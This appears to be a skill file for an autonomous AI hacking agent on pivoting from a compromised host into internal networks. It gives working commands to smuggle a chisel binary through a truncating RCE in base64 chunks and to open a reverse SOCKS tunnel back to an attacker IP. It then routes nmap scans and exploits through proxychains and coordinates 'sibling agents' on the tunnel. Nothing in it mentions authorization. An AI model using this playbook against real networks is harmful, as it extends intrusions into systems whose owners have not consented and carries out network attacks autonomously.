---
name: svc-pivoting
description: Turn a foothold into a RELIABLE pivot (SOCKS tunnel + persistent shell) so internal volume never rides a fragile stateless RCE. Use the moment you have code-exec on a dual-homed/edge host and need to reach an internal segment. Triggers - dual-homed host, "not reachable from my box", internal CIDR behind a foothold, RCE truncates output, need proxychains/nmap through a host, chisel/ligolo.
tags: [exploitation, post_exploit]
---

# Pivoting — reliable SOCKS + persistent shell

## When this fires
You have code-exec on a host that can reach an internal segment your attacker box cannot (dual-homed edge host, DMZ box). STOP routing volume through the stateless RCE — its output truncates and one wave of concurrent requests can kill it. Stand up a persistent tunnel FIRST, register it, then route all internal scans/exploits through it. Use `tunnel_manage action:plan` to generate the filled-in recipe; this skill is the methodology + the fallbacks.

## Decide the tunnel type
- **`ssh -D` (dynamic SOCKS)** — you have SSH creds/key on the foothold. Simplest, no binary to land. First choice when SSH works.
- **chisel reverse SOCKS** — no SSH, but you can exec + reach your attacker IP outbound. Land one static binary, get a full SOCKS5. Default for a web/RCE foothold.
- **ligolo-ng** — you need a full route (not just SOCKS) or nested/multi-hop pivots. Route-based (tun iface), cleanest for deep internal work.
- Reverse shell alone is NOT a pivot — it gives exec, not network reach. Convert to one of the above for internal scanning.

## Land the binary through a constrained RCE (the make-or-break)
An egress-restricted / curl-less foothold whose RCE truncates output CANNOT `wget` chisel. Stage it base64-chunked:
```
# attacker: fetch static binary (match arch), chunk it single-line-safe
curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_<ver>_linux_amd64.gz | gunzip > chisel
split -b 2000 <(base64 -w0 chisel) /tmp/ch_
# push each chunk THROUGH the RCE (append; order matters), then reassemble on target:
for f in /tmp/ch_*; do <RCE> "echo -n $(cat "$f") >> /tmp/chisel.b64"; done
<RCE> "base64 -d /tmp/chisel.b64 > /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel --version"
# node-only foothold (no base64/coreutils): Buffer.from(fs.readFileSync('/tmp/chisel.b64','utf8'),'base64')
```

## Stand it up
```
# chisel reverse SOCKS — attacker side:
chisel server --reverse --port 8000 --socks5
# foothold side (after staging):
/tmp/chisel client <ATTACKER_IP>:8000 R:9050:socks &
# ssh dynamic SOCKS (if you have creds):
sshpass -p '<pw>' ssh -D 9050 <user>@<foothold> -N -f      # or -i key
```

## VERIFY before trusting it (skip this and you'll waste hours on a dead tunnel)
```
printf 'strict_chain\n[ProxyList]\nsocks5 127.0.0.1 9050\n' > /tmp/pc.conf
proxychains4 -q -f /tmp/pc.conf nmap -sT -Pn -n -p 22,80,445 <internal-host>   # a hit = tunnel UP
```
Then `tunnel_manage action:register` (record pid + local_port) so sibling agents route via `state_query sessions`. Re-`healthcheck` periodically — a dead tunnel silently swallows traffic.

## Route internal work through it
- All internal nmap/curl/exploit: `proxychains4 -q -f /tmp/pc.conf <cmd>` (SOCKS types) or just target the routed subnet (ligolo).
- `nmap` over SOCKS must be `-sT -Pn` (connect scan; SYN/ping need raw sockets the proxy can't carry).
- SERIALIZE heavy work through one foothold — don't fan out concurrent agents onto a single tunnel/RCE (it can crash the host).

## Pitfalls
- Pushing a multi-line/binary payload through a truncating RCE without staging → corrupt binary, hours lost. Always chunk+verify.
- Forgetting `--socks5` on `chisel server` → `R:socks` has nothing to connect to.
- `proxychains` with SYN scan / ICMP ping → all-filtered false negative. Use `-sT -Pn`.
- Not registering the tunnel → sibling agents don't know it exists and re-hammer the RCE.
- Treating a reverse shell as a pivot → you still can't scan the segment. Build SOCKS/route.
